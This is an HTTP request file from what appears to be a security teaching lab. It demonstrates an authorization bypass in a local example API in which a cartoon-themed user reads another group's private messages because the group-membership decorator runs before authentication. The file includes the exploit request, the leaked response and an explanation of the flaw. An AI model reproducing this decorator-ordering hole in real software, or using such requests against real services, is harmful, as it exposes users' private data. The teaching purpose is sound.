@base = http://localhost:8000/policy-composition-and-precedence/merge-order-and-short-circuit/example1

### First, verify that Plankton should NOT be able to access Krusty Krab messages
### This would normally fail with proper authorization:
GET {{base}}/groups/staff@krusty-krab.sea/messages
Authorization: Basic plankton@chum-bucket.sea:burgers-are-yummy

# Expected: 403 Forbidden: not a member of the requested group
# Actual: 200 OK with sensitive data!

###

### EXPLOIT: Plankton accesses the Krusty Krab's messages WITHOUT any parameter tricks!
GET {{base}}/groups/staff@krusty-krab.sea/messages
Authorization: Basic plankton@chum-bucket.sea:burgers-are-yummy
# Results in sensitive data disclosure:
#
# [
#   {
#     "from": "mr.krabs@krusty-krab.sea",
#     "message": "I am updating the safe password to '123456'. Do not tell anyone!"
#   }
# ]
#
# IMPACT: Plankton has stolen the safe password with the simplest possible attack -
# a straightforward GET request! The authorization is completely ineffective because
# of decorator composition order. The @check_group_membership_v2 decorator executes
# BEFORE @basic_auth_v2, so when it checks g.group, that variable hasn't been set
# yet (g.group is None). The authorization check passes vacuously, allowing Plankton
# unrestricted access. This demonstrates that decorator order matters critically for
# security - even with correct authorization logic, wrong composition order creates
# a complete bypass. This is more dangerous than parameter confusion because there's
# no subtle attack vector to detect; the authorization simply doesn't execute at the
# right time in the request lifecycle.
